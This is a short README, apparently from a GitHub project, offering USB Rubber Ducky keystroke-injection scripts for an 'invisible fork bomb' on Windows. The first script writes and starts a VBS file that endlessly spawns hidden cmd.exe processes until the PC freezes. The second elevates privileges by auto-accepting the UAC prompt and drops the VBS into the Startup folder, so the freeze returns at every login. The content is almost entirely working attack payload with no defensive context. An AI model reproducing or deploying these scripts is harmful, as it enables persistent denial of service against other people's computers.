# Invisible Fork Bomb [Windows 7 and upper]
**V. 2.0:** The script creates and starts a vbs that executes exponentially cmd.exe without visible windows (Fork bomb -> Freezes the PC).

**V. 3.0:** The same, but it sets the vbs file into the startup.

**Original repository:** <a href="https://github.com/BlueArduino20/Invisible_fork_bomb">https://github.com/BlueArduino20/Invisible_fork_bomb</a>

**Author:** BlueArduino20

<h2>Code for Ducky [2.0]</h2>

<pre><code>DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING copy con forkb.vbs
ENTER
STRING do
ENTER
STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
ENTER
STRING loop
CTRL z
ENTER
DELAY 50
STRING start forkb.vbs && exit
ENTER
</pre></code>

<h2>Code for Ducky [3.0]</h2>
[Warning] That version sets the vbs file into the startup.

<pre><code>DELAY 1000
CTRL ESC
DELAY 500
STRING cmd
CTRL SHIFT ENTER
DELAY 400
ALT y
DELAY 500
STRING copy con "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FB.vbs"
ENTER
STRING do
ENTER
STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
ENTER
STRING loop
CTRL z
ENTER
DELAY 50
STRING start FB.vbs && exit
ENTER
</pre></code>